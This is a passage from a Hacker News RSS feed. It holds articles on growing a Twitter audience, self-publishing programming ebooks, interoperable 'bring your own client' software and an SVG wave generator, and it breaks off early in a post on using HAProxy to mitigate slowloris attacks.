</figure><p>While it is almost fruitless to wait for a similar black swan event, it is important to notice trends and contribute your existing expertise when the occasion occurs. You want to ride the rising waves, not the dying tides.</p><p>For example, Yaro Bagriy launched <a href="https://newslettercrew.com/">Newsletter Crew</a> when he realised there was no podcast that specifically focused on newsletters. The steep ascent of Substack in the past year also meant that he was riding a rising tide and could capture on the momentum.</p><p>A quick note: Randall has wrote a new tweet (that was not a response to others) only 2-3 times a month thus far. That is to change-</p><p>Tweet engagement: 50 likes, 18 comments.</p><p>🗓 April 27 2020: April was the clear pivot month in which Randall was very active in putting out her own content. </p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>So far in my career I've worked as a front-end engineer, a full-stack engineer, a blockchain engineer and an iOS engineer. </p><p>Having a CS degree doesn't matter.</p></div>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1254491098296143872?ref_src=twsrc%5Etfw">April 26, 2020</a></blockquote>

</figure><p>This thread is an example of one that garnered a lot of engagement, with 2 reasons on hindsight:</p><ol><li>This tweet is very encouraging to people who are looking to break into tech but do not necessarily have the formal education for it. Given how popular technology jobs are right now, there is a similar desire for people to acquire tech skills.</li><li>It is divisive- many people interpreted it as a way of shitting on formal CS degree (which was not what Randall meant), but nonetheless it increased engagement as it invited discussion on the matter.</li></ol><p>Tweet engagement: 2k likes, 247 comments.</p><p>🗓 May 16 2020: Sell your specific knowledge. Every month or so, sit down and brainstorm specific knowledge that your audience can benefit from. This is especially true if most of your peers are too busy/focused on the actual job itself, but neglect how more junior people desire the knowledge. You don't necessarily need to be at the very top of your game, you just need to be one step ahead of people in something. In fact, I'm a firm believer that you have more to teach the person a step behind you than the one who is ten steps behind you.</p><p>Randall understands this principle extremely well, and has been putting out tons of specific advice.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I reviewed hundreds of resumes this month. Here are the common issues I found. Thread.</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1261484755708571650?ref_src=twsrc%5Etfw">May 16, 2020</a></blockquote>

</figure><p>Notice how helpful threads like this gain a huge amount of engagement, and are the main reason why her Twitter following ballooned during this period. 🎈</p><p>Tweet engagement: 3.3k likes, 784 comments.</p><p>🗓 May 21 2020: The power of curation. What I love about this tweet is not just how helpful it is, but also how attainable. You don't have to be an expert to curate- in fact, if you decided 3 months ago to start learning a new skill and have gone through a few courses, you can rank the courses and curate those that have been more helpful. This goes back to the idea of helping someone a step behind you.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Here’s a list of resources for developers who want to crush the technical interview.</p><p>Thread</p></div>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1263309093457944576?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p>Tweet engagement: 7.2k likes, 2k comments.</p><p>🗓 June 20 2020: Wow this tweet blew up! 🥳 (It has 20.7k likes at the point of me writing this.) Randall has been mostly targeting the developers/wanna-be developers audience. But this tweet was a little more general- targeting anyone who wishes to learn how to code.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I don’t have a CS degree so I've had to learn on my own. Thread on creating your own CS degree online.</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1274133745222615041?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>

</figure><p>This is pretty much the inversion of what we suggested just now- finding out which subset of your target audience is neglected and working to serve them. But serving your audience need not be mutually exclusive.</p><p>You can think of your potential audience as subsets of each other- perhaps it helps from time to time to jump from your smaller audience to write for a larger audience and see how it turns out. Likewise, if you feel that you are writing for too general an audience, you can always zoom in and cater to specific niches.</p><p>This concludes today's time capsule on how Randall Kanna grew her Twitter following. I highly recommend that you check out the threads- not only are they extremely helpful, they act as a benchmark that you can measure your own output by.</p><p>In our next issue, we are going to examine how Randall self-published her first book and made $30k, then spun off subsequent products such as a podcast and more books. If you will like to be the first to receive that issue, <a href="https://theirtimeline.com/">subscribe now</a>! For the price of a ☕️ a month, you gain access to <em>all 4 entrepreneurial espresso- </em>short issues that motivate and educate you in 5 minutes so that you can grow your own business as well! 📈</p><p>Keep building! 🔨</p>
                        <section>
                            <h2>Enjoying these posts? Subscribe for more</h2>
                            
                            <br>
                            
                        </section>
    </div>
        
</article>                            </main>
</div>
        </div></div>]]>
            </description>
            <link>https://theirtimeline.com/randall-kanna-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356122</guid>
            <pubDate>Fri, 05 Mar 2021 12:34:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Paying my bills with 'free' ebooks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26356095">thread link</a>) | @asicsp
<br/>
March 5, 2021 | https://learnbyexample.github.io/my-book-writing-experience/ | <a href="https://web.archive.org/web/*/https://learnbyexample.github.io/my-book-writing-experience/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    

    <div>
      <p><strong>TL;DR</strong>: Small victories are more precious when you have nothing. Instead of burning through my savings, I'm now adding to it. The relief is priceless.</p>
<h2 id="it-is-worth-it-for-me">It is worth it (for me)<a href="#it-is-worth-it-for-me" aria-label="Anchor link for: it-is-worth-it-for-me">🔗</a></h2>
<p>The section title is my response to this article <a href="https://martin.kleppmann.com/2020/09/29/is-book-writing-worth-it.html">Writing a book: is it worth it?</a> that I saw on <a href="https://news.ycombinator.com/item?id=24628549">Hacker News</a>.</p>
<p>For my unique circumstances, the decision to write ebooks has brought me financial stability, improved my mental health and gives me a sense of satisfaction. This could've come from any of my previous attempts to earn money, but ebooks is what worked out for me.</p>
<p><img src="https://learnbyexample.github.io/images/books/book_writing.jpg" alt="Book writing"></p>
<p><i>Photo by <a href="https://unsplash.com/@bramnaus">Bram Naus</a> on <a href="https://unsplash.com/photos/n8Qb1ZAkK88">Unsplash</a></i></p>
<br>
<h2 id="how-it-all-started">How it all started?<a href="#how-it-all-started" aria-label="Anchor link for: how-it-all-started">🔗</a></h2>
<p>I left my job in 2014 for various reasons. I didn't have any plans for the future, just knew that I couldn't work as an employee any more.</p>
<p>After enjoying my break, I had to try something to start earning again. I wrote an android gaming app, fantasized earning loads of money with an awesome work planner/communicator software that never left my imaginations, tried a small stint with <a href="https://krishworks.com/">a team making an educational app</a>, etc. I failed due to various reasons — didn't try hard enough, quit early, didn't fit my skills, wasn't good at design/marketing and so on. The educational app for example went on to become a success. Or perhaps, having saved enough to live out a few years without working meant I wasn't under enough pressure to earn.</p>
<p>Among these failures, college workshops was the sole bread giver (and long way from supporting my living costs). My bachelor's degree was in electronics and communications and I had worked in a semiconductor company. So I knew enough to teach students pursuing similar courses the basics for Linux command line, Vim, Perl, Bash scripting, etc. As reference materials, I used to provide ppt slides (when I still had a job). Now that I had loads of free time, I started expanding my knowledge. Came to know about sites like Stackoverflow/Stackexchange/Reddit/etc. With newer and better materials to learn from, I created PDFs (using LibreOffice, which was pretty much the only option I knew about).</p>
<p>Another loss maker was getting a domain/host to share these learning materials. Web development was too much for me and the (ugly) site didn't get any love. In hindsight, one of the better turning points was learning about GitHub in 2016. I loved markdown's nice output with syntax highlighting (and realized I was using it poorly in Reddit) and GitHub's social aspect (stars, issues, etc) — plus I can use Vim! I manually converted my materials from LibreOffice to markdown (again, I didn't know that tools like <code>pandoc</code> could've helped me). Just like any other skill, I was learning and getting better with every iteration. That was the year I learned Python (thanks to <a href="https://inventwithpython.com/"><strong>Al Sweigart</strong></a>'s free coupon for "Automate the Boring Stuff with Python" video course) and started conducting workshops for Python instead of Perl.</p>
<p>Being active on Stackoverflow and Reddit, I finally became proficient at CLI one-liners (late by 8 years, since it would have significantly helped in my role as a design and test engineer). I came across articles/books on regular expressions and one-liners. I thought — I can do that too, plus I was really liking them. Thus began my epic <a href="https://github.com/learnbyexample/Command-line-text-processing">Command Line Text Processing</a> repo, another big turning point in my journey as an author.</p>
<br>
<h2 id="encouraging-signs">Encouraging signs<a href="#encouraging-signs" aria-label="Anchor link for: encouraging-signs">🔗</a></h2>
<p>Over the course of ten months, I managed to complete the holy trinity of <code>grep</code>, <code>sed</code> and <code>awk</code> one-liners. I promoted these tutorials on Reddit, Google+, LinkedIn and other social sites I knew at that time. The repo got hundreds of stars and more importantly, I got critical feedback. I was ecstatic, even if I was continuing to burn through my savings.</p>
<p>Then, I got to know about Hacker News (I think it was someone bragging about reaching front page). It took me a while to get used to Reddit, and HN was similarly alien to me. I posted a few links as a test and then I was <a href="https://news.ycombinator.com/item?id=15549318">brave enough to submit</a> my <code>awk</code> one-liners post. I was refreshing HN anxiously for about half an hour or so. It got one vote and then other submissions pushed it away from new posts tab. Disappointed, I moved on. After sometime, I was checking traffic on my GitHub repo as usual, a habit I had picked up (all kinds of points, karma, likes, etc were so enticing). I noticed a HUGE spike in traffic and star count, the likes of which I had never seen before/since. The last time I had felt that proud of my work was during my job. This comment made the most impression on me:</p>
<blockquote>
<p>These are the best stories on HN and why i subscribed here in the first place. I have often seen awk used so many times on SO but I've always put it up for something later to learn. Finally today I have some basic understanding of awk and this is really great stuff! I did get by with Perl but this is definitely more handy and the example approach to teaching it makes is super easy to understand!</p>
</blockquote>
<p>After the euphoria had died down (about a week I guess), I was thinking about all the various kinds of posts I could make. And I was thinking how to use the repo popularity to bring in money. Long story short, I ended up adding donate buttons to my repos. This was before GitHub sponsors was announced. I wanted my materials to be freely available, so I wasn't even thinking about creating paid only options. Despite adding more tutorials, getting featured in <a href="https://rubyweekly.com/issues/389">rubyweekly</a> and other newsletters, social sites, etc, all I got was a single recurring donation (which ended prematurely when that platform switched payment set up).</p>
<p>Another turning point came when a friend of mine was authoring a book and referred me for the reviewer role. Around that time, I had been converting <a href="https://github.com/AllenDowney/ThinkPython2">Think Python</a> to <a href="https://github.com/learnbyexample/ThinkRubyBuild">Think Ruby</a> and simultaneously working on a separate Ruby tutorial. During the book review process, I was given a list of topics and asked if I was interested in writing a book (they were impressed by my existing repos). The topics were either beyond my knowledge or out of scope, and they weren't interested in the repos I had already put up.</p>
<p>My friends were always suggesting me to write a book and my reply consistently had been that I wasn't good enough to write one (the imposter syndrome hasn't left me even now). The book review experience, existing repos, my tryst with Think Ruby, dwindling savings, etc changed my mindset enough to try. By then I was already familiar with Leanpub, so I knew self-publishing was an option. I picked a niche topic (<a href="https://learnbyexample.github.io/Ruby_Regexp/">Ruby Regexp</a>), <a href="https://learnbyexample.github.io/customizing-pandoc/">learned enough <code>pandoc</code> to produce a PDF</a> and published it even before the book review ended. It helped that I already had material as part of the Ruby tutorial I was working on. I still had to work a lot, since tutorial description was all bullet points.</p>
<p>I got only a few sales, but I had landed another review (video course for the same book) and was getting paid. So, I converted 'Ruby Regexp' to <a href="https://learnbyexample.github.io/py_regular_expressions/">Python re(gex)?</a>. I made it free for a few days and posted on Reddit, HN and other social sites. HN submission didn't get any traction, but fortunately Reddit was a big hit — thousands of free downloads and a few paid ones enough to cover 2 months of my expenses. I should mention now that I live alone, in outskirts of an Indian city, and my modest lifestyle costs about $150 per month. What works for me won't necessarily suit others.</p>
<br>
<h2 id="a-dip-followed-by-sustainable-momentum">A dip followed by sustainable momentum<a href="#a-dip-followed-by-sustainable-momentum" aria-label="Anchor link for: a-dip-followed-by-sustainable-momentum">🔗</a></h2>
<p>Encouraged by the second release, I changed my focus from updating my GitHub repos to writing books. All those repos were now a fodder for book conversion. I picked up <code>grep</code> first and included <code>ripgrep</code> as well to keep it inline with the trend. Got decent sales from <em>free</em> promotions. HN submission tanked at first, but got good attention when I posted again after a revision. Then I published a new version of 'Python re(gex)?' with significant changes and this HN submission got good views too. But note that these HN hits weren't anywhere close to what my <code>awk</code> one-liners post had received.</p>
<p>Writing <code>sed</code> took a lot out of me. Probably I was getting jaded again, juggling between workshops and ebooks. Then I had a medical issue. I didn't even try promoting the <code>sed</code> book on HN. I managed to learn enough JS to write <a href="https://github.com/learnbyexample/learn_js_regexp">JavaScript regexp</a>. Wasn't anywhere close to what I got from the Python book.</p>
<p><img src="https://learnbyexample.github.io/images/books/roller_coaster.jpg" alt="Roller Coaster"></p>
<p><i>Photo by <a href="https://unsplash.com/@davidtrana">David Traña</a> on <a href="https://unsplash.com/photos/mmdchg5UPtQ">Unsplash</a></i></p>
<p>So, despite reasonable reception during free promotions, my ebooks weren't still good enough to consistently pay my bills. Combined with workshops I was just about making my ends meet. I was losing interest and the medical issue was continuing. Still, without anything else to do, I finally started <code>awk</code> book. Things started getting better for a few months and then the pandemic hit.</p>
<p>Given the recent medical scare, pandemic fears and the trend of giveaways, I decided to open source my book contents. And, I made all my ebooks free to download indefinitely. Made a single bundle of all the 5 books I had published until then to make it easier to download in one shot. The reception was better than expected. Shortly after (March last week), I published the <code>awk</code> book early by cutting corners like excluding exercises. All books bundle now had 6 entries. Again, the reception was much better than expected. I hadn't made so many paid sales during a month ever before.</p>
<p>Encouraged by the success, I made another important decision. Instead of starting another book, I took up the task of updating all my books. I alloted a month or two for this task, but it took me more than 4 months in the end. It wasn't that I had lot of new features to add. The feedback I had received over the past year and my own improving writing skills meant that I just couldn't help updating the books to the best of my abilities. Somehow, lockdown and fear of the pandemic ended up improving my workflow.</p>
<p>Workshops weren't going to come my way anytime soon, but ebook sales for about 6 months averaged $200+ per month. For the first time since leaving my job, I was saving money!!! During this period all my books were free to download, in addition to the markdown source being available from …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://learnbyexample.github.io/my-book-writing-experience/">https://learnbyexample.github.io/my-book-writing-experience/</a></em></p>]]>
            </description>
            <link>https://learnbyexample.github.io/my-book-writing-experience/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356095</guid>
            <pubDate>Fri, 05 Mar 2021 12:30:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bring Your Own Client]]>
            </title>
            <description>
<![CDATA[
Score 496 | Comments 224 (<a href="https://news.ycombinator.com/item?id=26355779">thread link</a>) | @pcr910303
<br/>
March 5, 2021 | https://www.geoffreylitt.com/2021/03/05/bring-your-own-client.html | <a href="https://web.archive.org/web/*/https://www.geoffreylitt.com/2021/03/05/bring-your-own-client.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Just a little note about the main problem I'm pondering these days...</p><div><p>It’s delightful to have the freedom to <strong>Bring Your Own Client (BYOC)</strong>: to choose your favorite application to interact with some data.</p>

<p>For example, I can program with Sublime Text, while my teammate uses vim, and we don’t need to fight to the death to pick one editor between us. There are dozens of text editors to choose from, and no lock-in from proprietary file formats.</p>

<p>Contrast this with Google Docs: in order to live collaborate with each other, we all need to use the same editor. For someone who spends their whole working day in Google Docs, this can be a serious limitation. I personally hate doing substantial writing in Google Docs.</p>

<p>In cloud apps, the live collaboration logic is usually coupled to a specific editor; even if Google wanted to expose an API for editing Google Docs in third-party editors, it would probably be very challenging. The situation is nicer with text editors and git, because editing is decoupled from collaboration logic. Our team only needs to agree on a version control solution, which exposes a simple API (local text files) that many editors can interact with.</p>

<p>To be fair, local vs cloud isn’t the only factor here—even in local software, collaborators are often forced to converge on a single proprietary client (Microsoft Office, Adobe suite); conversely, a cloud service can support a third-party client ecosystem with the right APIs and attitude. Still, cloud apps exacerbate the problem. With local files, there’s some default openness built in; even proprietary file formats can be reverse-engineered. With cloud apps, the default is a single official client, unless the service actively exposes an API (and doesn’t shut it down—looking at you, Twitter).</p>

<p>It seems like local-first software is a good foundation for promoting Bring Your Own Client more broadly. What would it look like to have a thriving ecosystem of third-party clients for Google Docs style word processing, which can all interoperate with each other, even supporting realtime collaboration?</p>

<h2 id="concrete-examples">Concrete examples</h2>

<p>Some successful existing examples of client ecosystems built around open standards:</p>

<ul>
<li>text editors / IDE</li>
<li>RSS readers</li>
<li>email clients</li>
<li>web browsers</li>
</ul>

<p>Places where I want to have BYOC:</p>

<ul>
<li>Google Docs. I wish I could write this very doc in my preferred editor, locally, but have also support for inline comments and live collaboration. Might it be possible to build a VSCode extension that edits Google Docs live? (Tricky, because Google doesn’t have a nice API to integrate with, but maybe doable)</li>
<li>Google Slides</li>
<li>Figma</li>
<li>Notion</li>
<li>Trello / Asana / shared todo lists</li>
<li>multiplayer code editor: live collaboration as in repl.it</li>
</ul>

<h2 id="finer-granularity">Finer granularity</h2>

<p>Today we generally think about BYOC at the “app” level. But can we go finer-grained than that, picking individual interface elements?</p>

<p>Instead of needing to pick a single email client, can I compose my favorite email client out of an inbox, a compose window, and a spam filter?</p>

<h2 id="problems-questions">Problems / questions</h2>

<ul>
<li><strong>Schema compatibility</strong>: do all the editors need to agree on a single rigidly specified format? If there are reconcilable differences between formats, can we build “live converters” that convert between them on every change? (Essentially, imagine collaborating between Pages and Microsoft Word, running a file export in both directions on every keystroke from either app) This problem is closely related to the problem of schema versioning within a single editor, but BYOC can complicate things much further.</li>
<li><strong>Preserving intent</strong>: the decoupling of git + text editors has a downside: the text format fails to capture the intent of edits, so git can’t be very smart about merging conflicts. Is this something fundamental to decoupling editors from collaboration? Or are there ways to design APIs that preserve intent better, while also supporting an open client ecosystem? (It seems like deciding on how you store your data in a CRDT is the key question here?)</li>
<li><strong>Additional editor-specific metadata</strong>: Some editors need to store additional data that isn’t part of the “core data model.” Eg, Sublime Text stores my <code>.sublime-workspace</code> file alongside the code source. How does this work smoothly without polluting the data being used by other editors?</li>
<li><strong>Code distribution</strong>: Traditionally code distribution happens through centralized means, but could code be distributed in a decentralized way alongside documents? If we’re collaborating together in a doc, can I directly share a little editor widget/tool that I’m using, without needing to send you a Github link? This might be overcomplicating things / orthogonal to the general idea here… (This idea inspired by <a href="https://webstrates.net/">Webstrates</a>, linked below)</li>
<li><strong>Innovation</strong>: Unfortunately stable open formats can limit product innovation—eg, email clients are tied down by adherence to the email standard. Can we mitigate that effect? I think web browsers have struck a good balance between progress and openness, despite frustrations in both directions.</li>
</ul>

<h2 id="addendum-faq">Addendum: FAQ</h2>

<p><em>Edited 2020-03-05: This post unexpectedly got popular on HN. As I drink my morning coffee, I’ll briefly respond to a few themes from the comments here.</em></p>

<p><strong>Q: Don’t standards make it harder to innovate?</strong></p>

<p>A: Yes, that’s a major challenge. For example, email and IRC have lagged behind Slack and Reddit, because it’s hard to change standards. We discussed this problem a bit in the <a href="https://www.inkandswitch.com/cambria.html#mastodon-protocol-evolution">Cambria paper, re: Mastodon</a>.</p>

<p>I think the key is to aim for more flexible and extensible standards: a useful 80% compatibility, rather than a perfect 100%.</p>

<p>Of course, once you abandon an exact standard, it’s easy to rack up tons of complexity. (I think the Semantic Web struggled with this problem trying to provide schema flexibility.) So we also need better tools to make partial compatibility easy to reason about, for both developers and users.</p>

<p><strong>Q: Hmm. 80% compatibility sounds like kind of a buggy mess? Word and OpenOffice don’t interop very well.</strong></p>

<p>A: I think with the right foundational tech for helping devs build maximally compatible formats, we can avoid the worst problems of incorrect format conversions. In the Cambria paper we sketched <a href="https://www.inkandswitch.com/cambria.html#lenses-in-action">a few examples</a> of partial compatibility, where Cambria guaranteed type safety and helped us easily avoid bugs.</p>

<p>That does leave a substantial design problem, though: even if everything works correctly, what do you show the <em>user</em> when two pieces of software aren’t fully compatible? How do you tell a user that their actions might show up differently for collaborators using different apps? I’m thinking a lot about these questions…</p>

<p><strong>Q: Cloud business models are so entrenched. Can this actually happen without government intervention?</strong></p>

<p>A:  It’s true that business incentives are a major challenge. Maybe some form of government intervention could help, but ultimately it’ll be fighting a headwind unless users and devs are excited for the change.</p>

<p>I think the most sustainable way to make progress is to make BYOC the most convenient option, for the typical user and the typical developer. On the desktop, it’s convenient for a developer to work with the user’s existing filesystem. On the web today, there’s no user-controlled filesystem, so it’s usually easiest to just put the data in a database, and add a ticket to the backlog for someday building a public-facing API. How would that change if we had a convenient user-controlled place to put data?</p>

<p>See the <a href="https://www.inkandswitch.com/local-first.html">local-first software</a> article by Ink &amp; Switch for some ideas on how new data architectures can make the right thing the easy thing, for both users and devs.</p>

<h2 id="prior-art">Prior Art</h2>

<ul>
<li><a href="https://webstrates.net/">Webstrates</a> has some great demos of this philosophy. It uses a centralized server for the live sync.</li>
<li>Webstrates descends from Michel Beaudouin-Lafon’s work on <a href="https://youtu.be/ntaudUum06E?t=727">instrumental interfaces</a>—"polymorphic" tools that can operate in different applications. For example, a color picker that I can use in any app.</li>
<li>The <a href="https://solidproject.org/">SOLID</a> decentralized web project has some closely related ideas: <a href="https://ruben.verborgh.org/blog/2017/12/20/paradigm-shifts-for-the-decentralized-web/#apps-become-views">“apps become views”</a>, creating a competitive marketplace of clients decoupled from data silos. In turn it’s heavily inspired by ideas from the Semantic Web.</li>
<li><a href="https://mashable.com/2009/05/28/google-wave-guide/">Google Wave</a> had some related ideas… A platform for realtime collaboration, with a rich open <a href="https://youtu.be/v_UyVmITiYQ?t=4207">extension API</a> intended for people to build various collaboration clients on top of. Seems like the common wisdom on why it failed is that it was <a href="https://gizmodo.com/what-in-the-hell-was-google-wave-trying-to-be-anyway-1835038967">too complicated</a> and tried to do too much.</li>
<li><a href="https://braid.news/">Braid</a> is exploring ways to extend HTTP to support collaborative editing across diverse clients.</li>
</ul>



<ul>
<li>I believe one piece of the puzzle here is declarative schema mapping, for example the <a href="https://www.inkandswitch.com/cambria.html">Cambria</a> project I worked on recently.</li>
<li>Granular BYOC starts to look like <a href="https://www.geoffreylitt.com/2020/07/19/tools-over-apps-for-personal-notetaking.html">software as curation</a>: assembling software out of smaller “extensions”</li>
<li>Also relates to document-centric computing ideas like OpenDoc. Some <a href="https://twitter.com/geoffreylitt/status/1362779218241855494">recent notes</a> I took on why that failed…</li>
<li>Part of the solution may involve extracting and synchronizing data from cloud services without going through official APIs, as demonstrated in my <a href="https://www.geoffreylitt.com/wildcard">Wildcard</a> project.</li>
</ul>

<h2 id="im-working-on-this">I’m working on this!</h2>

<p>I’m currently pursuing a PhD at MIT doing research on this topic. Lots of challenges and open questions ahead, but I have some ideas for how to make progress. I’m particularly excited about clever ways to incrementally nudge us from the status quo to a BYOC world, rather than reinventing everything.</p>

<p>If you want to follow along with future updates, you can subscribe via the links below.</p>

<p>And if you have ideas about this topic or want to chat, feel free to <a href="mailto:gklitt@gmail.com">get in touch</a>.</p>

<h2 id="ps-idea-incubation">PS: idea incubation</h2>

<p>I actually wrote this note 10 months ago and had totally forgotten about it.</p>

<p>An hour ago, I randomly came across it and was quite amused. It includes some ideas which I <em>thought</em> I had started thinking about only recently. But it turns out they’ve been incubating in my mind for a long time. Funny how that works!</p>
</div></div>]]>
            </description>
            <link>https://www.geoffreylitt.com/2021/03/05/bring-your-own-client.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355779</guid>
            <pubDate>Fri, 05 Mar 2021 11:47:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Free SVG Wave Generator]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26355584">thread link</a>) | @narekb
<br/>
March 5, 2021 | https://www.softr.io/tools/svg-wave-generator | <a href="https://web.archive.org/web/*/https://www.softr.io/tools/svg-wave-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-appid="8f7af9fb-a550-425d-b327-48195c193a5f"><nav id="header"><div><!-- Logo --><p><a href="https://www.softr.io/"><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/9774cc17-156a-4cc2-99cc-ce21bcd4d459.svg" alt="Publish your designed things."></a></p><!-- mobile toggle --></div></nav><section id="custom-code1"></section><section id="feature-grid3"><div><!-- Header --><!-- Subheader --><div><p>A free design tool to create colorful, multilayer, random, unique, and organic-looking SVG waves.</p></div><div><div><h6>Customize</h6><p>Change the number of waves, complexity, height, colors and gradient  to create different types of organic SVG waves</p></div><div><h6>Randomize</h6><p>Press the randomize button until you find a SVG wave you like</p></div><div><h6>Download</h6><p>Get the wave as an SVG, PNG or copy the code directly into your clipboard</p></div></div></div></section><section id="cta2"></section><header id="hero1"><div><div><div><p>SVG Wave Generator is a free tool made by Softr for creating random wave-like shapes that you can use in your landing page designs, social media images, product feature showcase, and so on. If you are not proficient with professional design tools but think you might need something like that for your website or for some other purpose, you can use the tool to generate random waves in a few seconds and download them as .png or .svg. There’s also an option to switch between curvy and sharp-edged waves as well as add a gradient to make the waves look even cooler. In addition, you can combine multiple waves to produce a more complex image at once. The image on the right is an example of a shape generated with SVG Wave Generator. It uses sharp edges, gradients, and a combination of 4 wave shapes.</p></div><p><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/2c65eb38-1235-44d8-bc2a-ecb6d2ab4dd8.png" alt="Image alt"></p></div></div></header><header id="hero2"><div><div><p><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/c2c2d625-1d31-4b25-9ed9-9c8585a04a01.png" alt="Image alt"></p><div><p>Wave-like shapes are really commonplace in today’s web design. The image shows a few examples of wave usage in websites. As you can see, they can be used in mobile apps, as a landing page background, site navigation bar background, and so on. With SVG Wave Generator, you can create similar shapes in just a few seconds and apply them in your designs.</p></div></div></div></header><header id="hero3"><div><div><div><p>To show how it can be applied in real life, let’s consider an example using our no-code website and web app builder – Softr. In Softr, you have the option of uploading a custom background image to almost all the building blocks that are used to construct a web app or a website. The image shows one of our hero area layouts, where an .svg generated by the Wave Generator has been added as a background image.

Thus, generating designs for your site with SVG Wave Generator is really easy and fun. Go ahead and try it yourself!</p></div><p><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/983e6e1d-aaad-4841-b49f-97ccd62e105b.png" alt="Image alt"></p></div></div></header><section id="cta1"><div><div><div><h2>The website you are reading now is built on Softr.</h2><p>Want to create yours?</p></div></div></div></section></div></div>]]>
            </description>
            <link>https://www.softr.io/tools/svg-wave-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355584</guid>
            <pubDate>Fri, 05 Mar 2021 11:23:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HAProxy – sysadmin’s swiss army knife]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26355381">thread link</a>) | @dory1133
<br/>
March 5, 2021 | https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/ | <a href="https://web.archive.org/web/*/https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<h2>HAProxy – sysadmin’s swiss army knife</h2>
				

		<div>
			<div><div><div>
	<div>
		<p><a href="http://www.haproxy.org/"><strong>HAProxy </strong>i</a>s a free, open-source, high-performance <strong>TCP/HTTP load balancer</strong>. HAProxy has been around since 2001, it’s written in C programming language, and it uses an insignificant amount of memory and CPU resources, even with very advanced manipulations on HTTP traffic.</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<p>It’s also very secure, having only fifteen security issues during the last seven years. Four of these issues were distribution-specific, six required a very high level of access (meaning the sysadmin maintaining the server would have a much bigger problem than HAProxy itself), and the last five were related mainly with denial of service attack vector.</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<p>We at Sysbee absolutely love HAProxy. Besides the load balancing feature, we use it for mitigation of DOS attacks, traffic filtering, advanced HTTP request routing and throttling – you name it. Heck, we use it on single-server setups as well!</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>HAProxy supports load balancing of TCP (layer 4) and HTTP (layer 7) traffic with various load balancing algorithms – round-robin, static, by weight, cookie or header to name a few.</p>
<p><strong>TPC mode</strong> is faster, and it’s ideal for load balancing various protocols that rely on TCP, e.g. MySQL, SMTP, Redis, and even HTTP if we’re not interested in inspecting HTTP traffic itself.</p>
<p><strong>HTTP mode</strong> is a slower method compared to the TCP mode, however, the speed at which HAProxy performs analysis and manipulation of HTTP traffic is measured in single-digit milliseconds, so the term “slow” is fairly relative.</p>

		</div>
	</div>
</div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h3><span>DOS mitigation and traffic filtering</span></h3>
</div></div>
	<div>
		<p>In addition to load balancing, HAProxy has some interesting “party tricks” that can help mitigate some types of HTTP-based denial-of-service attacks and ensure server stability. Here are a few examples.</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>Slowloris attacks are a type of a DOS attack which allows a single machine to take down a web server with minimal bandwidth and side effects on unrelated services and ports. Slowloris tries to keep open as many connections to the target web server as possible, for as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request, and then periodically sending subsequent HTTP headers, adding to, but never completing the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients.</p>
<p>Threaded web servers are the most susceptible to such attacks (e.g. Apache, especially when using prefork multi-processing module). However, web servers with an asynchronous, event-driven architecture (where the request receives it in the background while other requests are processed) are also in peril of such an attack.</p>
<p>Mitigations are possible with the Apache mod_reqtimeout module, with Nginx limit connections per specific IP address and the like.</p>
<p>HAProxy is also event-driven, but with an intelligent protection mechanism.<br>To mitigate slowloris attacks, HAProxy only needs one directive – timeout http-request timeout – which defines the maximum accepted time to receive a complete HTTP request headers (without data).</p>
<p>We found that 10 seconds is low enough to keep the bad guys at bay and high enough to avoid terminated connections when the client has slow internet access.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Maximum time to receive complete HTTP request headers
timeout http-request 10s</pre>

		</div>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
